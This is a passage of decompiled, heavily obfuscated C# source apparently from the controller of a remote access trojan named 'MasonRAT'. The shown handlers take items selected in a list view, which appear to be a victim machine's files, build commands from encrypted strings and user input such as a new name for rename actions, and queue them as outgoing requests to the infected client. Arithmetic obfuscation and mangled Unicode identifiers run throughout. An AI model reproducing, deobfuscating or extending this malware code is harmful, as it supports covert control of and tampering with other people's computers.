        this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.Substring(0, checked (this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text.LastIndexOf(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 265)) + 1));
        this.\u2694️MasonRAT\u270Cڙب\u060E\u0609ـــۚــ\u060Bټ\u060C\u060F();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cۭ\u0609ڙــټ\u060Dٸـــ(object sender, EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        int imageIndex = selectedItem.ImageIndex;
        if (imageIndex < 0 || imageIndex > 1)
        {
          if (imageIndex == ((-1577093511 ^ 19) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) - ~((1261655650 ^ 355721205 % 971047752) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1))
          {
            string[] strArray = new string[(1514079075 + (198072832 | 101908598) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + ~(-1762216484 - 752375818 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0];
            strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 266);
            strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
            strArray[((27 ^ 8) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 ^ (2147412780 ^ (1202905904 | 2104421149)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 267);
            strArray[((1004811423 > 892905562 ? 1646261373 : -2099952132) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 > (181565814 > 268697593 ? 1116179316 : 837134487) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 >> 0 ? (1466757937 > 30714235 ? 3 : 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0 : (-1479433925 ^ ~1479433920) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
            strArray[((1985585144 | 451111008) - 1619312000 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 ^ (-75999521 - (928570042 | 2116204684) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) % (-1786910760 - 1985033377 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
            strArray[(90619 + (1695006441 >> 359317917) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0) - (-920021579 - -1662356474 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) + 0 >> 1823804196 - 145237111 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0] = selectedItem.Text;
            Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
          else
          {
            string[] strArray = new string[((822907542 ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) ^ 0) - (-1963988321 - (1450759685 << 226944482) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0];
            strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 268);
            strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
            strArray[(935094759 - -284970893 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 > ((165152402 > 1419672444 ? 988549502 : 741412127) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) ? 853437489 - 1966158629 % 1112721142 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0 : -1841408030 - -1841408032 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 269);
            strArray[((-1261869810 ^ ~203264829) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0) - (233680591 - ~960322297 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
            strArray[((1373995926 > 1549377060 ? 865835037 : 649376278) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 0 > (1972905589 ^ 75203918 >> 1417521720) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << 0 ? 1199796034 - 1199796029 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 : 1293430788 + (1400265978 << 1614223211) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
            strArray[((1845035001 ^ (626559731 | 1822457676)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0 ^ 1073741827 /*0x40000003*/ + (960036174 << 234455293) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)] = selectedItem.Text;
            Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060D\u0609\u060D\u0608ـڞب\u060Fۙ\u0609ـ\u0608ـٸ̨ٺـۛ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060Aۧ\u0608\u060Dـۏ\u0608ـۛﻋٽۏ\u060Fـٺٸب\u060Aـ(
    object sender,
    EventArgs e)
  {
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cڙ\u060B\u060E\u060Fـ\u060Dـــ\u060Fټــــۧۨ.SelectedItems)
      {
        int imageIndex = selectedItem.ImageIndex;
        if (imageIndex < 0 || imageIndex > 1)
        {
          if (imageIndex == (((1138700677 >> 1626826615) - 115606896 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) + (-16597439 - -479024491 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) - 0 >> ((-1376244178 ^ ~1132177523) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1))
          {
            string Left = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 270), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 271), selectedItem.Text, (1516788992 - 1127105064 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) - 0 ^ ~((534331851 ^ 149117715 % 823255834) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1), ((-189084646 ^ 1349639551 << 1642821295) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 0) + -((436554768 ^ 11) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1);
            if (Operators.CompareString(Left, selectedItem.Text, false) != 0)
            {
              string[] strArray = new string[(976897251 + (176799901 >> 926982575) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 << 0) + -(1156101358 - (302689883 << 457030952) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1];
              strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 272);
              strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
              strArray[((797617125 ^ 1465840992 % 1552119319) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0) + -(661828522 + 1365355225 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 273);
              strArray[-862378928 - 1918805069 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0 + (((-686076549 ^ ~1296704914) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ 0) << (-485167155 - ~1274147808 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
              strArray[510233621 + (1488479646 << 725501034) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 - ((1092078034 ^ 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0 >> ((1592614739 ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)] = this.\u2694️MasonRAT\u270C\u0608\u060Dىٽ\u060Bــ؁̨ـۙۧڞ.Text;
              strArray[716524312 - 716525208 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 + (584413512 - -360956981 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0 >> 426521300 + 754019872 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 >> 1] = selectedItem.Text;
              strArray[((-671265355 ^ ~326501632) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) ^ 0) - (997501129 + (30368814 >> 1761372493) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) >> 0) % (-1821273308 - (553209426 << 1831213244) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
              strArray[24976707 - ~2053107395 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) + 0 + (242136267 + (341162148 >> 480221314) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + 0 << ((1019042404 ^ (992328836 | 404501004)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0] = Left;
              Outcoming_Requests outcomingRequests = new Outcoming_Requests(this.\u2694️MasonRAT\u270Cۭڙﻋٻ\u0609اڼۡؤﻋٻۛدﻋـ, Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray)));
              Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
            }
          }
          else
          {
